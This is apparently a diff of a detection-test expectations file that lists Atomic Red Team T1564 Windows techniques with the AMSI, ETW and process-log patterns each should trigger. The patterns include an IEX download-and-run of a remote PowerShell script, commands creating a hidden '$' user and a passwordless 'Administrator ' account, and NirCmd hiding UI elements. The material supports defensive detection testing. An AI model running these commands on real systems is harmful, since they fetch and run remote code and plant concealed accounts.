@@ -1,27 +1,13 @@
-T1564,windows,6afe288a,Extract binary files via VBA
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content~=$macro = [System.IO.File]::ReadAllText("
-_E_,AMSI,scan_content~=\atomics\T1564\src\T1564-macrocode.txt")
-_E_,AMSI,scan_content~=$macro = $macro -replace "aREPLACEMEa", "
-_E_,AMSI,scan_content~=\atomics\T1564\bin\extractme.bin"
+T1564,windows,6afe288a,Extract binary files via VBAS
+FYI,Test failed due to the non availability of MS Word in the current setup
 _E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 _E_,AMSI,scan_content~=IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
 _E_,AMSI,scan_content~=Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list~=$macro = [System.IO.File]::ReadAllText("
-_E_,ETW,event_data_list~=\atomics\T1564\src\T1564-macrocode.txt")
-_E_,ETW,event_data_list~=$macro = $macro -replace "aREPLACEMEa", "
-_E_,ETW,event_data_list~=\atomics\T1564\bin\extractme.bin"
-_E_,ETW,event_data_list~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-_E_,ETW,event_data_list~=IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-_E_,ETW,event_data_list~=Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
 
 T1564,windows,2ec63cc2,Create a Hidden User Called "$"
 _E_,Process,cmdline~=net user $ ATOMIC123! /add /active:yes
 
 T1564,windows,5bb20389,Create an "Administrator " user (with a space on the end)
-_E_,AMSI,app_name~=PowerShell
 _E_,AMSI,scan_content~=New-LocalUser -Name "Administrator " -NoPassword
 
 T1564,windows,333c7de0,Create and Hide a Service with sc.exe
@@ -34,9 +20,5 @@ T1564,windows,2748ab4a,Command Execution with NirCmd
 ARG,nircmd_location,PathToAtomicsFolder\..\ExternalPayloads\nircmd.exe
 ARG,command_to_execute,win child class "Shell_TrayWnd" hide class "TrayClockWClass"
 ARG,cleanup_command_to_execute,win child class "Shell_TrayWnd" show class "TrayClockWClass"
-_E_,AMSI,app_name~=PowerShell
-_E_,AMSI,scan_content*=cmd /c .*atomics.*ExternalPayloads.*nircmd.exe #{command_to_execute}
-_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
-_E_,ETW,event_msg~=Creating Scriptblock text
-_E_,ETW,event_data_list*=cmd /c .*atomics.*ExternalPayloads.*nircmd.exe #{command_to_execute}
+_E_,AMSI,scan_content~=nircmd.exe,scan_content~=#{command_to_execute}
 
